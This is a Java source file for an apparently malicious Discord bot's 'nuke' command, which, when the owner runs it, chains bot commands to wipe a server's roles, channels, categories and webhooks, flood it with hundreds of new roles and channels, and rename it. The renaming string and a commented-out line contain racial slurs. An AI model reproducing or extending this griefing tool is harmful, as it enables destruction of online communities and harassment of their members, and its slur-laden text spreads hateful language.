package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class GriefServerCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {

        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }

        int i = 1;

             event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "delroles").queue();
            event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(i++, TimeUnit.SECONDS);
           // event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "cvc 200").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "ccat 200").queueAfter(i++, TimeUnit.SECONDS);
            event.getChannel().sendMessage(Core.PREFIX + "dtc").queueAfter(i++, TimeUnit.SECONDS);
            //event.getChannel().sendMessage(Core.PREFIX + "ctc 50").queueAfter(i++, TimeUnit.SECONDS);
            //event.getGuild().getTextChannels().get(new Random(event.getGuild().getTextChannels().size()).nextInt()).sendMessage(Core.PREFIX + "nigger 50").queueAfter((i++ + 10), TimeUnit.SECONDS);

    }

    @Override
    public String getHelp() {
        return "Griefs the server\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "'";
    }

    @Override
    public String getInvoke() {
        return "rekt";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

     @Override
    public Category getCategory() {
        return Category.NUKE;
    }
}
